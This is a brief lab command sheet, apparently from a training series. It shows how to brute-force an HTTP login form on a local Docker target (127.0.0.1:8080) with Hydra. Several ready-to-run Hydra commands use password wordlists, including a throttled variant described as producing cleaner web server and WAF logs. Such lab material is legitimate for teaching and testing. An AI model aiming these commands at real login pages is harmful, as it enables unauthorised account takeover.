# Hydra 02 HTTP form - Commands

## Target validation

```bash
curl -sS -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8080/login.php
```

## Hydra quick run (`http-post-form`)

Failure string must match the HTML/body marker when auth fails (`Invalid username or password` in this lab).

```bash
hydra -l labuser -P words-quick.txt 127.0.0.1 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

## Hydra demo run (longer list)

```bash
hydra -l labuser -P words-demo.txt 127.0.0.1 -s 8080 -t 4 -V http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

## Slower run (cleaner web server / WAF logs)

```bash
hydra -l labuser -P words-demo.txt 127.0.0.1 -s 8080 -t 1 -W 2 -V http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

## Save output artifact

```bash
hydra -l labuser -P words-demo.txt 127.0.0.1 -s 8080 -t 1 -V -o artifacts/hydra-http-form.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password"
```

## Optional: watch container access log

```bash
docker logs -f hydra-http-form-target
```
